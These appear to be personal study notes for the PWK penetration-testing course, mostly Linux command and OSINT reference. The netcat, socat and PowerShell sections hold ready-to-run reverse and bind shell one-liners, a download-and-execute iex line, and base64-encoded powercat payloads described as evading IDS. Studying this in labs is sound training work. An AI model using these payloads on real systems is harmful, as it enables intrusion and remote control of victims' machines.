# linux-tips + pwk course contents

### `man`
- Keyword search in all man pages: `man -k keyword`
- Search using apropos (equivalent to man -k): `apropos {{keyword}}`

### `mkdir`
- Create several dirs at the same time: `mkdir -p test/{recon,exploit,report}`

### `systemctl`
- `sudo systemctl start ssh`
- Check that service is running: `sudo ss -antlp | grep sshd`
- To start ssh at boot time run: `sudo systemctl enable ssh`
- To start an Apache http server: `sudo systemctl start apache2`
- See all available services: `systemctl list-unit-files`

### `apt` and `dpkg`
- Update packages cache, repositories, versions, descriptions: `apt update`
- To upgrade the system run `apt upgrade`, to upgrade just one package `apt upgrade {{package name}}`
- To search in the internal cache packages db: `apt-cache search {{keyword}}`
- Show package information: `apt show {{package name}}`
- Install with `apt install`
- Completely remove package, including all config files, with `apt remove --purge {{package name}}`
- To install .deb package: `dpkg -i {{route to deb file}}`

### Bash shell
- Display id of the current shell instance: `echo $$`
- Display all env vars: `env`
- Display history with: `history`
- History returns a number for each entry. Run it again with `!{{command number}}`
- Repeat last command with `!!`
- Set `HISTSIZE` to configure the number of commands saved in memory for the current session, and `HISTFILESIZE` to configure the total size of the bash history.

### Piping and redirection
Programs executed from the command line have 3 streams:
- stdin: Program input
- stdout: Program output (default terminal)
- stderr: Errors (default terminal)

Redirections:
- Redirect to new file: `echo "whatever" > newfile.txt`
- Append to existing file: `echo "whatever" >> existing_file.txt"`
- Redirecting stderr: According to POSIX, stdin, stdout and stderr are defined by 0, 1, 2. To redirect the stderr we can append `2>errors.txt` to the command. Also doing `2>/dev/null` is helpful for ignoring errors.

### Text search and manipulation
#### sort
Sort by field 1: ```sort -k1```
Sort desc: ```sort -r```

#### grep
- Grep searches text files for occurrences of regular expressions
- Common flags include `-r` to recursively search, `-i` to ignore case and `-v` to do a reverse grep (exclude matching lines)
- Find subdomains: `grep -o '[^/]*\.site\.com' index.html | sort -u > list.txt`

#### sed
- Sed is an stream editor
- `echo "I love Windows" | sed 's/Windows/GNU\/Linux/'`

#### cut
- Extract sections from a line and send it to stdout
```
echo "pear,apple,banana" | cut -d "," -f 2
apple
```

#### awk
```
echo "hola::friend::amigo" | awk -F "::" '{print $1, $3}'
hola amigo
```

#### comm
```
comm file1.txt file2.txt
```
Displays results in 3 columns:
1) lines just present in file1
2) lines in both files
3) lines just present in file2

Removing lines: ```-{1}{2}{3}``` eg. ```-12``` removes columns 1 and 2.

### vimdiff
Open vim with the diff open in 2 buffers, much clearer than diff or comm in my opinion.

### Background process
The quickest way to background a process is to append an ampersand (&) to the end of the command to send it to the background immediately after it starts.

Other related commands:
- ctrl + z to suspend a process
- `bg` to resume the process suspended in the background
- `fg` returns a process to the foreground
- `jobs` lists all process being executed from the current terminal session
- `fg %{{process_number}}` foregrounds the process with number process_number (processes are listed with their number when running jobs)
- it can also be `fg %{{beginning of the command}}`

### `ps` (process status)
Unlike jobs, it lists processes system-wide.
It also works in powershell, it is an alias to ```Get-Process cmdlet```.

- `ps -ef`: select all processes in full format listing
- `ps -fC {{application name}}`: search by app name (I tried this and it didn't really show the process I was looking for)

### `tail`
Monitor the end portion of a log file with `tail -f`. Get last x lines with `tail -nx`.

### `watch`
Repeat a command each n seconds (2 by default) and continuously watch its output. Watch the execution of the `w` command each 5 seconds:
```watch -n 5 w```

### `wget`
Download with output file name:
```wget -O {{output_file}} {{url}}```

Download just specific file types:
```wget -A '*.pdf -r example.com ```

### `curl`
```
curl -o {{output_file}} {{url}}
```

### `axel`
Download acceleration using several processes (given by the -n flag):
```
axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
```

### `alias`
```
alias alias_name="command"
```
`unalias` unsets an alias.

### `netcat`
- Check if port is open (no dns lookup, verbose): `nc -nv {{ip}} {{port}}`
- Listen: `nc -lvpn {{port}}`
- Receive file: `nc -nlvp 4444 > incoming.exe`
- Send file: `nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe`
- Bind shell (server binds shell): `nc -nlvp 4444 -e cmd.exe`
- Reverse shell (client binds shell): `nc -nv {{ip}} {{port}} -e /bin/bash`

### `socat`
Similar to netcat with some extra features.
- Connect to http server: `socat - TCP4:<remote server's ip address>:80`
- A dash `-` is necessary to trasfer data between a socket and a STDIO
- Listen on a port: `sudo socat TCP4-LISTEN:443 STDOUT`
- Transfer file (http server): `sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt`. Note that fork creates another thread, this is good for when there is more than one client, either for file uploads or to (reverse) shells.
- Transfer file (http client): `socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create`
- Reverse shell: 
  - Server (attacker): `socat -d -d TCP4-LISTEN:443 STDOUT`. `-d` just increases verbosity.
  - Client (target): `socat TCP4:10.11.0.22:443 EXEC:/bin/bash`
- Create self-signed certificate to add encryption to the connection:
```
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
```
- Bind shell securely:
```
sudo socat OPENSSL-LISTEN:4433,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

Connect to server:
```
socat - OPENSSL:10.11.0.4:443,verify=0
```

### Powershell
To set unrestricted policy:
```
Set-ExecutionPolicy Unrestricted
```

Download file:
```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

#### Reverse shell
Listener/Server/Attacker: `sudo nc -lnvp 443`

Client/Victim:
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"
```

#### Bind shell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',4445);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

### `powercat`
Powershell version of netcat.
Install in Kali: `apt install powercat`.

The installation process places the script `powercat.ps1` at `/usr/share/windows-resources/powercat`. Copy the script to the Windows machine, and then run it from powershell in this way: `. .\powercat.ps1`. This makes variables and functions defined in the script accessible to the PS console. From here the command `powercat` is available.

Tip: It is also possible to download the powercat script and run it using`iex`: ```iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')```

#### Send file
```
powercat -c 10.0.2.15 -p 4445 -i /path/to/file/to/send
```

#### Reverse shell
```
 powercat -c 10.0.2.15 -p 4445 -e cmd.exe
```

`-l` is for listening and perform all the opposite actions :)

#### Generation of powershell payloads
Use `-g` to generate the powershell payload:
```
powercat -c 10.0.2.15 -p 4445 -e cmd.exe -g > connect.ps1
```

When executed from powershell, the script will connect to the attacker and bind a shell. The problem with this type of payload generation is that any intrusion detection system (IDS) would detect it.

Use `-ge` to generate a base64 encoded payload instead:
```
powercat -c 10.0.2.15 -p 4445 -e cmd.exe -ge > connect_base64.ps1
```

Then execute it passing directly the encoded string to powershell using the -E flag:
```
powershell -E {{paste the base64 encoded payload}}
```

### `tcpdump`
- Open existing capture file: `sudo tcpdump -r password_cracking_filtered.pcap`
- Filtering traffic:
  - Get ip + port ($3), order them and count how many time each combination appears in the file:
```
sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $3 }' | sort | uniq -c | head
```
  - Tcpdump also includes filters:
    - `tcpdump src host {{source host}}`
    - `tcpdump dst host {{destination host}}`
    - `tcpdump port {{port}}`
- Dump packet contents in hexa and ascii by adding `-X`
- To get tcp packets that have ACK + PSH (data packets) add: `'tcp[13] = 24'`

### `bash`
- Start scripts with `!#/bin/bash`. `!#` is called she-bang.
- Declare variable: `hello=holaaa`
- Reference variable: `echo $hello`
- Quoting strings:
  - Single quotes: `'hola'`. Bash treats all characters as literals.
  - Double quotes: `"hola"`. All characters exepting `$` and `\` are treated as literals:
- Save the result of a command in a variable:
  - `result=$(whoami)` (preferred option)
  - ``` result=`whoami` ```
- Add `#!/bin/bash -x` to print the code being executed also and not just its output.
- Read user input to variable using read: `read response; echo $response`
- To specify prompt: `read -p 'Username: ' username`. To make user input invisible add `-s`
- Conditions:
```
if [ <some test> ]
then
  <perform an action> 
fi
```
<img src="https://i.imgur.com/E17rdBa.png" alt="drawing" width="500"/>

- Use `&&` to execute a command just if the last command was successful and `||` if it failed.
```
grep $user2 /etc/passwd && echo "$user2 found!" || echo "$user2 not found !"
```
Note they are also the `and` and `or` logical operators.
- For general structure:
```
for var-name in <list>
do
<action to perform>
done
```
  - Loop one-liners examples:
    - `for ip in $(seq 1 10); do echo 10.11.1.$ip; done`
    - `for ip in {1..10}; do echo 10.11.1.$ip; done`
- While structure:
```
while [ <some test> ]
do
<perform an action>
done
```
- Function:
```
function function_name {
  commands...
}
```
or
```
function_name () {
  commands...
}
```
- Passing args:
```
pass_arg() {
  echo "Today's random number is: $1"
}
pass_arg $RANDOM
```
- Local variables: `local name="Joe"`
- Iterate over file lines:
```
for url in $(cat list.txt); do host $url; done
```
- Get capture of site: `cutycapt --url=$ip --out=$ip.png`

### OSINT
- Check page for contacts -> verify social media
- `whois {{domain name}}`

#### Google
- `site:{{site}}`
- `filetype:{{filetype eg php}}`
- Exclude filetype: `-filetype:php`
- `intitle:"index of"`
- https://www.exploit-db.com/google-hacking-database

#### [Netcraft](https://netcraft.com)
- Search for dns information at https://searchdns.netcraft.com
- Check report for getting detailed information about the server
- The report also has a "Site Technology" section that lists technologies of the server

#### recon-ng
- Search available modules: `marketplace search {{keyword | leave empty to list all}}`
  - Note the columns D (has dependencies) and K (requires keys). See info of module for details.
- Get module info: `marketplace info {{module path}}
- Install module: `marketplace install {{module path}}`
- Load module: `modules load {{module path}}`
- Get info after loading module (including variables to set): `info`
- Set option: `options set {{option}} {{value}}`
- Run: `run`
- Unload module: `back`
- Show what was obtained so far: `show`
- Resolve hosts IPs: `recon/hosts-hosts/resolve`
- For github modules, generate token at https://github.com/settings/tokens. Then add it using `key add github_api {{key}}`

#### Open Source
Tools:
- [Gitrob](https://github.com/michenriksen/gitrob): Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github. Gitrob will clone repositories belonging to a user or organization down to a configurable depth and iterate through the commit history and flag files that match signatures for potentially sensitive files. The findings will be presented through a web interface for easy browsing and analysis.
  - Example: `GITROB_ACCESS_TOKEN={{yourtoken}} ./gitrob {{username}}`
  - Install by downloading the binary, it didn't work for me in any other way.
- [Gitleaks](https://github.com/zricethezav/gitleaks): Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.
`gitleaks -r {{repository}}`

#### Shodan
Search `hostname:{{domain}}`

#### Headers scan
Search site on `https://securityheaders.com` to analyze headers.

#### SSL verifications
Search site on `https://www.ssllabs.com/ssltest/` to analyze SSL security.

#### Pastebin
Search for domain names on pastebin, or anything else.
